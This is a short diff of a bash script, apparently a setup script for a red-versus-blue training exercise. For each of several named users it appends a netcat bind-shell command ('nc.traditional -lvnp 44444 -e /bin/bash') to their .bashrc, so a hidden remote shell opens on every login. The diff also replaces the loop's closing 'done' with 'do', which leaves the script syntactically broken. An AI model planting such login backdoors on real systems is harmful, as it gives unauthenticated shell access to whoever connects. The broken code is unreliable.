@@ -28,8 +28,8 @@ done
 
 blueusers=("king" "duke" "knight" "lady" "baron" "scribe")
 for user in "${blueusers[@]}"; do
-    touch "/home/$username/.bashrc"
+    touch "/home/$user/.bashrc"
     ip=$(hostname -I | awk '{print $1}')
-    echo "nc.traditional -lvnp 44444 -e /bin/bash >/dev/null 2>&1 &" &>> "/home/$username/.bashrc"
+    echo "nc.traditional -lvnp 44444 -e /bin/bash >/dev/null 2>&1 &" &>> "/home/$user/.bashrc"
     chown "$user:$user" "/home/$user/.bashrc"
-done
+do
